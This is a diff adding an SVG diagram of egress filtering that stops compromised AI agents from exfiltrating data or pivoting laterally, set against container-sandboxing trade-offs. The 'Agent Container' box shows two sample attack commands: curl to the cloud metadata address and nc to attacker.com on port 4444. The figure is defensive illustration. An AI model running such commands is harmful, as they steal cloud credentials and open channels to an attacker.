@@ -1,0 +1,48 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 450" width="100%" height="100%">
+  <defs>
+    <linearGradient id="bgBoxSand2" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#0f172a" />
+      <stop offset="100%" stop-color="#082f49" />
+    </linearGradient>
+  </defs>
+
+  <rect width="800" height="450" rx="16" fill="url(#bgBoxSand2)" stroke="#334155" stroke-width="2" />
+
+  <text x="40" y="50" fill="#38bdf8" font-family="system-ui, sans-serif" font-size="14" font-weight="700" letter-spacing="1.5">FIGURE 2: AIR-GAPPED NETWORK EGRESS FILTERING</text>
+  <text x="40" y="78" fill="#f8fafc" font-family="system-ui, sans-serif" font-size="20" font-weight="800">Blocking Exfiltration and Lateral Pivot Attacks by Compromised Agents</text>
+
+  <!-- Left: Sandbox Container -->
+  <rect x="40" y="130" width="220" height="150" rx="12" fill="#1e293b" stroke="#38bdf8" stroke-width="2" />
+  <text x="60" y="160" fill="#f8fafc" font-family="system-ui, sans-serif" font-size="14" font-weight="700">Agent Container</text>
+  <text x="60" y="185" fill="#fca5a5" font-family="monospace" font-size="11">Compromised Prompt</text>
+  <text x="60" y="205" fill="#cbd5e1" font-family="monospace" font-size="10">curl http://169.254.169.254</text>
+  <text x="60" y="225" fill="#cbd5e1" font-family="monospace" font-size="10">nc attacker.com 4444</text>
+  <text x="60" y="250" fill="#fca5a5" font-family="system-ui" font-size="10" font-weight="700">Attack Intent: Exfiltrate</text>
+
+  <!-- Arrow to Gateway Firewall -->
+  <path d="M 260 205 L 320 205" stroke="#ef4444" stroke-width="3" />
+  <polygon points="325,205 315,200 315,210" fill="#ef4444" />
+
+  <!-- Middle: iptables & Network Filter Gate -->
+  <rect x="330" y="130" width="220" height="150" rx="12" fill="#450a0a" stroke="#ef4444" stroke-width="2.5" />
+  <text x="350" y="160" fill="#fca5a5" font-family="system-ui, sans-serif" font-size="14" font-weight="800">Egress Firewall Gate</text>
+  <text x="350" y="185" fill="#fef08a" font-family="monospace" font-size="11">iptables / eBPF Filter</text>
+  <text x="350" y="205" fill="#f8fafc" font-family="monospace" font-size="10">• Metadata IP: BLOCKED</text>
+  <text x="350" y="225" fill="#f8fafc" font-family="monospace" font-size="10">• Private Subnet: BLOCKED</text>
+  <text x="350" y="250" fill="#fca5a5" font-family="system-ui" font-size="11" font-weight="800">DROP PACKET (No RST)</text>
+
+  <!-- Right: Protected Host & Cloud Secrets -->
+  <rect x="580" y="130" width="180" height="150" rx="12" fill="#064e3b" stroke="#10b981" stroke-width="2" />
+  <text x="600" y="160" fill="#86efac" font-family="system-ui, sans-serif" font-size="14" font-weight="700">Protected Assets</text>
+  <text x="600" y="185" fill="#f8fafc" font-family="monospace" font-size="11">Internal Services:</text>
+  <text x="600" y="205" fill="#94a3b8" font-family="monospace" font-size="10">• Cloud IAM metadata</text>
+  <text x="600" y="225" fill="#94a3b8" font-family="monospace" font-size="10">• Redis / DB Ports</text>
+  <text x="600" y="245" fill="#94a3b8" font-family="monospace" font-size="10">• Docker daemon socket</text>
+  <text x="600" y="265" fill="#86efac" font-family="system-ui" font-size="10" font-weight="700">Completely Inaccessible</text>
+
+  <!-- Tradeoff Panel -->
+  <rect x="40" y="310" width="720" height="100" rx="12" fill="#0f172a" stroke="#334155" stroke-width="1.5" />
+  <text x="60" y="338" fill="#f8fafc" font-family="system-ui, sans-serif" font-size="13" font-weight="700">Sandboxing Trade-Off Note:</text>
+  <text x="60" y="362" fill="#94a3b8" font-family="system-ui, sans-serif" font-size="11">MicroVM and container spinning introduces a 150ms to 400ms startup latency overhead per task. When NOT to use: Avoid containerized sandboxing for pure in-memory mathematical calculations or string formatting where native JS functions are provably safe.</text>
+  <text x="60" y="388" fill="#38bdf8" font-family="monospace" font-size="11">&gt; docker run --rm --network none --read-only --cap-drop ALL --memory 512m agent-runner</text>
+</svg>
